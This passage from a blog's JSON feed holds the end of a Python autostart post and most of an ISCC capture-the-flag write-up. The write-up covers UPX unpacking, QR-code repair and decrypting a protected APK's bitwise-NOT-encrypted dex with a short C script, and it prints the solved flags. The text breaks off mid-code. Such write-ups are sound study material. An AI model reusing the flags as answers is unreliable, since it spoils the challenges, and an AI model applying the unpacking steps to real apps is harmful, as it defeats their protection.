id=\"添加win10弹窗提醒\"><a class=\"anchor\" href=\"#添加win10弹窗提醒\">#</a> 添加 Win10 弹窗提醒</h1>\n<p>这里我使用的是 win10toast 模块，创建对象后，使用 <code>show_toast()</code>  即可成功弹窗。</p>\n<h1 id=\"开机自启\"><a class=\"anchor\" href=\"#开机自启\">#</a> 开机自启</h1>\n<ul>\n<li>方案一 加入 Windows 服务<br />\n首先使用 Pyinstaller 将程序编译为 exe，然后使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dpbnN3L3dpbnN3L3JlbGVhc2Vz\"> WinSW</span>，将程序添加为 Windows 服务。<br />\n优点：B 格很高<br />\n缺点：有 BUG，可能是 win10toast 的问题，也可能是 python 打包文件的问题，虽然能完成登录，但无法弹窗。</li>\n<li>方案二 添加到 <code>启动</code> 文件夹<br />\n这种很简单，写一个 bat，运行脚本，最后把 bat 放到 <code>AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>  文件夹中即可。<br />\n优点：简单，实用<br />\n缺点：B 格不够，运行太慢，会弹黑框框</li>\n</ul>\n",
            "tags": [
                "Python",
                "Python",
                "爬虫"
            ]
        },
        {
            "id": "https://a1oyss.github.io/CTF/ISCC%E4%B8%80%E6%97%A5%E6%B8%B8/",
            "url": "https://a1oyss.github.io/CTF/ISCC%E4%B8%80%E6%97%A5%E6%B8%B8/",
            "title": "ISCC一日游",
            "date_published": "2020-10-08T10:53:44.000Z",
            "content_html": "<p>#CTF</p>\n<h1 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> REVERSE</h1>\n<p><span id=\"more\"></span><br />\n 去网上搜 flag 时发现是 2018 原题<br />\n首先 IDA 打开发现 UPX 壳，使用 <code>UPX -d</code>  脱壳，然后放进 IDA 里面看源码</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153561506-d3b917c1-5fd7-41e0-8aba-842283e0ab6a.png#align=left&amp;display=inline&amp;height=793&amp;margin=%5Bobject%20Object%5D&amp;originHeight=793&amp;originWidth=1061&amp;size=0&amp;status=done&amp;style=none&amp;width=1061\" alt=\"\" /></p>\n<p>有点不忍直视，放弃，直接放进 OD 里面跑。<br />\n调试了几次，摸清了大致流程：</p>\n<ol>\n<li>接收字符串</li>\n<li>根据接收到的字符串打印出来东西<br />\n然后打印出来的东西本身是在程序里存着，像这样：</li>\n</ol>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153561550-7b420aad-d85e-47ef-a8d0-f33f0cb285e5.png#align=left&amp;display=inline&amp;height=416&amp;margin=%5Bobject%20Object%5D&amp;originHeight=416&amp;originWidth=933&amp;size=0&amp;status=done&amp;style=none&amp;width=933\" alt=\"\" /></p>\n<p>把这些数据拿出来转成字符串就是这种：</p>\n<pre><code>\n666f72 495343 5f6172 696375 746869 6e6773 617379 696666 437b41 6c747d 5f6265 6c6c5f 655f64 68657965\n\nfor ISC _ar icu thi ngs asy iff C&#123;A lt&#125; _be ll_ e_d heye\n\n</code></pre>\n<p>输入 -&gt; 输出规律：</p>\n<pre><code>\n1 -&gt; for\n\n2 -&gt; ISC\n\n3 -&gt; _ar\n\n4 -&gt; icu\n\n5 -&gt; thi\n\n6 -&gt; ngs\n\n7 -&gt; iff\n\n8 -&gt; _ar\n\n9 -&gt; C&#123;A\n\n10-&gt; lt&#125;\n\n11-&gt; _be\n\n12-&gt; ll\n\n13-&gt; e_d\n\n14-&gt; hey\n\n15-&gt; e_t\n\n16-&gt; e_e\n\n</code></pre>\n<p>接着拼出 flag-&gt;ISCC {All_things_are_easy_before_they_are_difficult}，翻译一下是凡事必先易后难，但是也可以拼成 All_things_are_difficult_before_they_are_easy (凡事必先难后易)，不是很懂出题人在想什么，<s>卡拉赞毕业打卡拉赞</s></p>\n<h1 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> MISC</h1>\n<p>依旧是原题，只不过看 2018 的 wp 貌似是个 gif，每帧都是不同的二维码，而这次直接弄了一堆到文件夹里</p>\n<p>抄下网上的 wp</p>\n<blockquote>\n<p>二维码要求在两个大黑框之间必须有连续的黑白点，这样才行</p>\n</blockquote>\n<blockquote>\n<p>逐帧分析 gif，发现只有第 62 帧存在一个校正图形</p>\n</blockquote>\n<blockquote>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153561673-cfa3e215-36ab-444e-932c-e20fa80a41ce.png#align=left&amp;display=inline&amp;height=227&amp;margin=%5Bobject%20Object%5D&amp;originHeight=227&amp;originWidth=226&amp;size=0&amp;status=done&amp;style=none&amp;width=226\" alt=\"\" /></p>\n</blockquote>\n<blockquote>\n<p>，保存补上位置探测图形和定位图形</p>\n</blockquote>\n<blockquote>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153561669-48338a1c-6f01-4e91-86b8-81e48a4e0f06.png#align=left&amp;display=inline&amp;height=360&amp;margin=%5Bobject%20Object%5D&amp;originHeight=360&amp;originWidth=359&amp;size=0&amp;status=done&amp;style=none&amp;width=359\" alt=\"\" /></p>\n</blockquote>\n<blockquote>\n<p>，扫描得到 ISRDQzgxMDI=，base64 解码得到！$CC8102</p>\n</blockquote>\n<blockquote>\n<p><s>嗦不粗话，连 flag 都没换</s></p>\n</blockquote>\n<h1 id=\"mobile\"><a class=\"anchor\" href=\"#mobile\">#</a> MOBILE</h1>\n<p>原题，最大的收获是找到了不少好用的工具</p>\n<p>放入 APKIDE 中打开，查看 <code>AndroidManifest.xml</code> ，看到启动类为 <code>com.example.shellapplication.WrapperApplication</code></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">WrapperApplication</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Application</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">static</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span><span class=\"token function\">loadLibrary</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"reinforce\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token keyword\">native</span> <span class=\"token keyword\">void</span> <span class=\"token function\">attachBaseContext</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Context</span> paramContext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token keyword\">native</span> <span class=\"token keyword\">void</span> <span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>这个类加载了 <code>libreinforce.so</code> ，接着去看 <code>onCreate()</code>  和 <code>attachBaseContext</code>  中的内容</p>\n<p>onCreate：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>v2 <span class=\"token operator\">=</span> a2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  v3 <span class=\"token operator\">=</span> a1<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  v4 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>a1 <span class=\"token operator\">+</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  v5 <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  v6 <span class=\"token operator\">=</span> _JNIEnv<span class=\"token operator\">::</span><span class=\"token function\">GetMethodID</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">,</span> v4<span class=\"token punctuation\">,</span> <span class=\"token string\">\"getPackageName\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"()Ljava/lang/String;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  v7 <span class=\"token operator\">=</span> _JNIEnv<span class=\"token operator\">::</span><span class=\"token function\">CallObjectMethod</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">,</span> v2<span class=\"token punctuation\">,</span> v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  v8 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> <span class=\"token punctuation\">(</span>__fastcall <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> _DWORD<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>_DWORD <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v3 <span class=\"token operator\">+</span> <span class=\"token number\">676</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">,</span> v7<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">_android_log_print</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"TTT\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"shellapplication's onCreate execute\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x100u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">,</span> <span class=\"token string\">\"/data/data/%s/lib/libcore.so\"</span><span class=\"token punctuation\">,</span> v8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  v9 <span class=\"token operator\">=</span> <span class=\"token function\">dlopen</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  v10 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span>__fastcall <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token function\">dlsym</span><span class=\"token punctuation\">(</span>v9<span class=\"token punctuation\">,</span> <span class=\"token string\">\"resume\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token function\">v10</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  _JNIEnv<span class=\"token operator\">::</span><span class=\"token function\">DeleteLocalRef</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">,</span> v7<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>  <span class=\"token keyword\">return</span> _JNIEnv<span class=\"token operator\">::</span><span class=\"token function\">DeleteLocalRef</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">,</span> v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>onCreate</code>  中加载了 <code>libcore.so</code>  以及调用了 <code>resume</code>  这个方法</p>\n<p>attachBaseContext：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">memset</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v23<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x100u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v23<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%s/protected.jar\"</span><span class=\"token punctuation\">,</span> v17<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">extractJar</span><span class=\"token punctuation\">(</span>v4<span class=\"token punctuation\">,</span> v5<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v23<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  byte_601C <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token function\">dalvikOrArt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v24<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x100u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v24<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%s/origin.dex\"</span><span class=\"token punctuation\">,</span> v17<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">decryptJar</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v23<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v24<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  v22 <span class=\"token operator\">=</span> v4<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token function\">memset</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v25<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x100u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v25<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%s/protected.so\"</span><span class=\"token punctuation\">,</span> v17<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>attachBaseContext</code>  中最关键的部分是对 <code>assets</code>  中的  <code>protected.jar</code>  进行解密，解密操作很简单，按位取反</p>\n<p>decryptJar：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> v9 <span class=\"token operator\">&lt;</span> v6 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v8 <span class=\"token operator\">+</span> v9<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token operator\">~</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>_BYTE <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>v7 <span class=\"token operator\">+</span> v9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token operator\">++</span>v9<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>解密脚本：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  FILE<span class=\"token operator\">*</span> fi<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span> fo<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  fo <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dec.dex\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"wb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  fi <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"protected.jar\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">char</span>  fBuffer<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">feof</span><span class=\"token punctuation\">(</span>fi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">fread</span><span class=\"token punctuation\">(</span>fBuffer<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> fi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 读取 1 字节</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">feof</span><span class=\"token punctuation\">(</span>fi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token operator\">*</span>fBuffer <span class=\"token operator\">=</span><span class=\"token operator\">~</span> <span class=\"token operator\">*</span>fBuffer<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// xor encrypt</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span>fBuffer<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> fo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 写入文件</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>之所以为什么用 C 来写。。。因为 python 按位取反之后返回的是 int 类型，而负数又没办法 <code>to_bytes()</code> ，写了半天也没写出来一个比较优雅的 exp，放弃。</p>\n<p>解密之后得到一个 dex 文件，使用 <code>dex2jar</code>  将其转成 jar 文件，使用 jd-gui 打开。</p>\n<p>onCreate 中调用 <code>ProtectedClass</code>  的 <code>verifyKey</code>  对输入进行检查：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">ProtectedClass</span><span class=\"token punctuation\">.</span><span class=\"token function\">verifyKey</span><span class=\"token punctuation\">(</span>inputText<span class=\"token punctuation\">.</span><span class=\"token function\">getText</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>              str <span class=\"token operator\">=</span> <span class=\"token string\">\"密码正确\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>              str <span class=\"token operator\">=</span> <span class=\"token string\">\"密码错误\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>ProtectedClass</code>  的逻辑：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">ProtectedClass</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> key <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span> <span class=\"token punctuation\">&#125;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">native</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getEncrypttext</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> paramString<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">String</span> <span class=\"token function\">getString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token string\">\"bfs-iscc\"</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token 